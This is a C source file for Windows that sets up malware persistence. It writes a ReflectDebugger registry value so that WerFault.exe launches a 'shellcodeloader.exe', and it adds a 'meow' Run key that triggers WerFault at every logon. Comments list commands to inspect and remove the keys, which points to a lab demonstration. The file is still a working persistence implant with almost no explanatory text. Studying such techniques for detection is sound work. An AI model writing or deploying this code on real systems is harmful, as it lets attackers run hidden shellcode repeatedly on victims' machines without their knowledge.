//reg query "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs" /s
//reg query "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs\ReflectDebugger" /s
//reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /s

/*
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Hangs" -Name "ReflectDebugger"
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "meow"
*/

#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
    HKEY hkey = NULL;

    // malicious app - This shellCodeLoader is Detected with Defender
    const wchar_t* exe = L"C:\\werfault-hack\\shellcodeloader.exe";

    // hijacked app
    const wchar_t* wf = L"WerFault.exe -pr 1";

    // set evil app
    LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs", 0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        // create new registry key
        RegSetValueEx(hkey, L"ReflectDebugger", 0, REG_SZ, (const BYTE*)exe, (wcslen(exe) + 1) * sizeof(wchar_t));
        RegCloseKey(hkey);
    }

    // startup
    res = RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        // create new registry key
        RegSetValueEx(hkey, L"meow", 0, REG_SZ, (const BYTE*)wf, (wcslen(wf) + 1) * sizeof(wchar_t));
        RegCloseKey(hkey);
    }
    return 0;
}
